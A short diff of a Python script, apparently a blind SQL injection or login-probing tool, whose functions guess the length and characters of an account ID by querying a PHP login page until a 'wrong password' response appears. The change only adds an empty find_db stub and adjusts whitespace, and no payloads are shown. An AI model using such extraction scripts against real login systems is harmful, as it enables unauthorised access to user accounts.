@@ -4,6 +4,12 @@ import requests
 #url = 'http://104.197.42.200/member/login_ok.php'
 #cookies = {'PHPSESSID': 'd42rp6qqm5fhj3dmn3830g74pq'}
 
+
+# def find_db(url, cookies):
+
+
+
+
 def find_id_len(url, cookies):
     id_len = 0
     while 1:
@@ -16,7 +22,7 @@ def find_id_len(url, cookies):
         if "wrong password" in response.text: 
             break
     return id_len #id 길이 반환
-
+    
 def find_id_str(id_len):
     id_str = ""
     for len in range(1,id_len+1):
